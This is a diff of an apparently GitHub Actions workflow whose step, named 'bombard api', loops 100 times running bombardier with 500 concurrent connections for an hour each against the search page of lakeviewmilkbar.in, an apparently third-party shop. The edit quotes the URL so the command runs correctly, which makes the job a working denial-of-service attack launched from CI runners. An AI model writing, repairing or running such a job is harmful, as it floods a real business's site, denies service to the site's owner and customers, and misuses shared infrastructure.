@@ -30,5 +30,5 @@ jobs:
     - name: bombard api
       run: |
         for i in {1..100} ; do
-          bombardier -c 500 -l -t 3600s -m GET https://lakeviewmilkbar.in/search/?type=product&options%5Bunavailable_products%5D=last&options%5Bprefix%5D=last&q=cakes&section_id=search-hidden
+          bombardier -c 500 -l -t 3600s -m GET "https://lakeviewmilkbar.in/search/?type=product&options%5Bunavailable_products%5D=last&options%5Bprefix%5D=last&q=cakes&section_id=search-hidden"
         done
